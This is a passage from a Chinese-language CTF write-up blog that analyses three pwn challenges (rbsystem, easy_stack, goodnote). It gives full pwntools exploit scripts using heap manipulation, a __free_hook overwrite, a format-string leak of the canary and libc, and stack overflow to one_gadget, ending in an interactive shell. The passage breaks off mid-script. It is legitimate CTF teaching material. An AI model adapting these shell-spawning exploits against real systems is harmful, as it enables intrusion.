src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9805:1" alt="36c2af7b57c3252edf4056fdf0e27636.png"><br>这里看到可以负数溢出，向前写。注意是通过stream来写的，那stream是从哪里来的呢，我们看看：</p><p>open_file功能：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9810:1" alt="6c138ae92b45c192e46ce518bb0a872d.png"><br>打开随机数文件</p><p>close_file 功能：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9808:1" alt="5b362e11850643d9a994097e9d3688bc.png"><br>关闭随机数文件，没有free功能。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h3><p>1.fopen打开文件操作：</p><p>我们常见的fopen函数会分配对应的heap地址去存放该文件结构体：</p><p>首先看反汇编源码：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9806:1" alt="4f8a252ed811c9990bd71e7f1de95d70.png"></p><p>查看对应的源代码：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9815:1" alt="e31c881f98e37cb2d484f49697c81ec3.png"></p><p>最后实际调用的是这个函数，其会malloc一个size大小为IO_FILE_PLUS + IO_wide_data即0x228大小的chunk：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9807:1" alt="5aff363060147da9711c164d010c36e1.png"></p><p>2.fread读取文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9816:1" alt="fee35a1c2fd43088aa6827507ba1d57b.png"><br>会分配一个0x1010大小的chunk</p><p>3.fclose关闭文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9811:1" alt="7f086d0d4c10d0228b8af8db3e8ec750.png"><br>会释放掉两个之前fopen创建的0x230 的chunk存放文件结构体以及fread时开辟的缓冲区0x1010大小的chunk</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>第一步：利用fopen和fread创建出0x1010的chunk，再fclose释放，再分配残留一个smallbin，再分配后show即可获得libc地址<br>第二步：利用随机数文件进行爆破，由于可以整数溢出向前写，但由于是通过随机数文件内容来写的，所以我们需要爆破，一个一个的向里面写，edit可以指定位置和size。需要爆破两个地址，一个是将fd改为free_hook地址。第二次是该free_hook为one_gadget。<br>第三步：fclose释放chunk的时候即可getshell</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#context.terminal = ['tmux','split','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./rbsystem'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>onegadgets<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rbsystem'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'f.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">20173</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>offset<span class="token punctuation">,</span>sz<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Offset: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">CloseFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>OpenFile<span class="token punctuation">(</span><span class="token punctuation">)</span>Add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>Add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>CloseFile<span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>Add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x1010</span><span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#unsorted bin:0x20</span>OpenFile<span class="token punctuation">(</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>Add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#1st 20 small bin               ## hou 3 30</span>CloseFile<span class="token punctuation">(</span><span class="token punctuation">)</span>Add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x1010</span><span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">0x40</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span>Add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>                      <span class="token comment" spellcheck="true">## qian 5 40   </span>Add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#2th 20 small bin</span>Add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#tcache:0x20</span>OpenFile<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#fill 6 size 2 random</span>Edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leak libc</span>Show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ebcf0</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">)</span>free_hook<span class="token operator">=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        Edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">+</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        Show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        r<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5 content</span>        r<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6 size</span>        c<span class="token operator">=</span>rud<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"\n1. allocate"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(c)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">==</span>free_hook<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>Add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>Add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span>onegadget<span class="token operator">=</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>onegadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        Edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token operator">+</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        Show<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>        c<span class="token operator">=</span>rud<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"\n1. allocate"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(c)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">==</span>onegadget<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>CloseFile<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="easy-stack"><a href="#easy-stack" class="headerlink" title="easy_stack"></a>easy_stack</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9804:1" alt="1e5e2c26ec831e3919681657309778c8.png"></p><h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9812:1" alt="80d7254effb85dba0c5914e9c28be3cf.png"><br>格式化字符串+栈溢出</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>格式化字符串泄露libc和canary，栈溢出改onegadget即可</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./easy-stack'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./easy-stack'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./x64_libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'f.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">20173</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#leak libc</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, welcome to easy-stack"</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">'b* 0x0000555555554000+0x9a9'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%29$p+%23$p"</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#leak libc</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">240</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#leak canary</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>    canary <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"canary => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"now give you a gift\n"</span><span class="token punctuation">)</span>    shell_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> gadgets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="goodnote"><a href="#goodnote" class="headerlink" title="goodnote"></a>goodnote</h1><h2 id="查看文件-2"><a href="#查看文件-2" class="headerlink" title="查看文件"></a>查看文件</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9823:1" alt="e77e14106e00aa9eee1117ae0631efff.png"><br>保护全开</p><h2 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9825:1" alt="f2e35244ff1ba8a7a1114c67d28c14a3.png"><br>很明显的整数溢出，当输入0x4000000000000000的size时，通过*4将会溢出，变成malloc(0)，但是size 0x4000000000000000已经写入bss中，那么就可以在后面溢出了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="en-resource://database/9817:1" alt="01f99144cb39379a9aa34890238810e9.png"><br>通过scanf来写入信息，0xdeadbeef来break停止输入。</p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>第一步：先利用malloc free malloc泄露libc地址，由于create没有编辑写入\x00截断，同时malloc也没有清空信息，就可以直接leak出。<br>第二步：利用写入改fd为free_hook，将free_hook改为system<br>第三步：创建一个带有/bin/sh的chunk，最后free即可getshell</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token 